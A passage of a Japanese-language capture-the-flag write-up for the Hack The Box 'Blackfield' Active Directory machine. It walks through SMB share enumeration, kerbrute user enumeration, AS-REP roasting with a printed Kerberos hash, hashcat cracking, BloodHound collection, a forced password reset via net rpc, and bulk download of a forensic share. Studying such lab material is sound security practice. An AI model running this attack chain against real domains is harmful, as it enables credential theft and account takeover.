# Recon

SMBシェアへアノニマスログイン：
```
┌──(shoebill㉿shoebill)-[~]
└─$ smbclient -L 10.10.10.192                            
Password for [WORKGROUP\shoebill]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share
```

profiles$を除くとたくさんのフォルダがある：


```
┌──(shoebill㉿shoebill)-[~]
└─$ smbclient '//10.10.10.192/profiles$'
smb: \> dir
  .                                   D        0  Thu Jun  4 01:47:12 2020
  ..                                  D        0  Thu Jun  4 01:47:12 2020
  AAlleni                             D        0  Thu Jun  4 01:47:11 2020
  ABarteski                           D        0  Thu Jun  4 01:47:11 2020
  ABekesz                             D        0  Thu Jun  4 01:47:11 2020
...
  ZScozzari                           D        0  Thu Jun  4 01:47:12 2020
  ZTimofeeff                          D        0  Thu Jun  4 01:47:12 2020
  ZWausik                             D        0  Thu Jun  4 01:47:12 2020
```

フォルダ名がユーザ名っぽいので、これらよりユーザリストusers.txtを作る：

```

┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ cat users.txt            
AAlleni
ABarteski
ABekesz
...
ZMiick
ZScozzari
ZTimofeeff
ZWausik
```
`kerbrute`で有効なユーザが三人見つかった：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ kerbrute userenum -v --dc 10.10.10.192 -d BLACKFIELD.local users.txt             

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

...
2022/10/28 13:46:02 >  [+] VALID USERNAME:	 audit2020@BLACKFIELD.local
...
2022/10/28 13:48:38 >  [+] VALID USERNAME:	 support@BLACKFIELD.local
...
2022/10/28 13:48:44 >  [+] VALID USERNAME:	 svc_backup@BLACKFIELD.local
```

この三人の名前をvalid_users.txtとして保存する。

そのユーザリストを使ってGetNPUsers.pyを実行する：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ impacket-GetNPUsers BLACKFIELD.local/ -no-pass -dc-ip 10.10.10.192 -usersfile valid_users.txt 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:953f9fcfb82c8ed65373a86861b8a7d6$006dd8c5f10c903610330d00c92c47cd3fb61c0966447d13c48011d6f40de4b8c5584a9be9b5c0e593f32d650665628ba1327550fb08b32e8c4fb3e64f50e7715a6bed96560cc4a44460f2bd891a673dd82bb082cf5447d4c320f9a8af2309c560ccd442f954275eb26902c18ead4f48c47a4f6e92d009357df9ea2a72e6c4f62e4f4e67a2606be502d7add27d6547c2d2463e2bbaf42a021ea80b731167be74c08abea059dfdb1eff1d5382b6d4e5604872b532a02af341b046ebf78ca96b4191393282441d54e12ed6abff47c4ae578c9d74d16ab0546799159d98188998154e278e1f63f3dcff0f8e80b869361f01796d18e1
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```
ユーザsupportのハッシュが得られたので、これをhashというファイル名で保存してクラックする：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt
...
$krb5asrep$23$support@BLACKFIELD.LOCAL:95...18e1:#00^BlackKnight
```
supportのクリデンシャルを使ってbloodhoundを実行する。

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
```

![hound-1](https://user-images.githubusercontent.com/85237728/198561622-a9cc4ee3-d39c-4b3c-bdee-154184de7fe7.png)

supportはaudit2020のパスワードを設定することができると判明（audit2020の現在のパスワードを知らなくても変更可能）。

そこで、audit2020のパスワードをPassw0rd2020に設定する：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ net rpc password audit2020 -U support -S 10.10.10.192
Enter new password for audit2020:
Password for [WORKGROUP\support]:
```
（コロンの次に入力した文字は表示されない）

audit2020のクリデンシャルでforensicというSMBシェアへアクセスする：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ smbclient -U 'audit2020%Passw0rd2020' //10.10.10.192/forensic
Try "help" to get a list of possible commands.
smb: \>
```

次のように、怪しいtxtファイルがある：

```
smb: \> dir
  .                                   D        0  Sun Feb 23 22:03:16 2020
  ..                                  D        0  Sun Feb 23 22:03:16 2020
  commands_output                     D        0  Mon Feb 24 03:14:37 2020
  memory_analysis                     D        0  Fri May 29 05:28:33 2020
  tools                               D        0  Sun Feb 23 22:39:08 2020

		5102079 blocks of size 4096. 1672550 blocks available
smb: \> cd commands_output\
smb: \commands_output\> dir
  .                                   D        0  Mon Feb 24 03:14:37 2020
  ..                                  D        0  Mon Feb 24 03:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 22:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 21:51:52 2020
  domain_users.txt                    A    16454  Sat Feb 29 07:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 21:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 21:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 21:51:01 2020
  route.txt                           A     3976  Sun Feb 23 21:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 21:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 21:54:29 2020
```

すべてダウンロードする：

```
smb: \commands_output\> mask ""
smb: \commands_output\> recurse ON
smb: \commands_output\> prompt OFF
smb: \commands_output\> mget *
getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (1.1 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (15.7 KiloBytes/sec) (average 5.5 KiloBytes/sec)
getting file \commands_output\firewall_rules.txt of size 518202 as firewall_rules.txt (183.1 KiloBytes/sec) (average 88.2 KiloBytes/sec)
getting file \commands_output\ipconfig.txt of size 1782 as ipconfig.txt (1.1 KiloBytes/sec) (average 70.3 KiloBytes/sec)
getting file \commands_output\netstat.txt of size 3842 as netstat.txt (2.4 KiloBytes/sec) (average 58.7 KiloBytes/sec)
getting file \commands_output\route.txt of size 3976 as route.txt (3.8 KiloBytes/sec) (average 53.1 KiloBytes/sec)
getting file \commands_output\systeminfo.txt of size 4550 as systeminfo.txt (4.3 KiloBytes/sec) (average 48.6 KiloBytes/sec)
getting file \commands_output\tasklist.txt of size 9990 as tasklist.txt (9.5 KiloBytes/sec) (average 45.3 KiloBytes/sec)
```




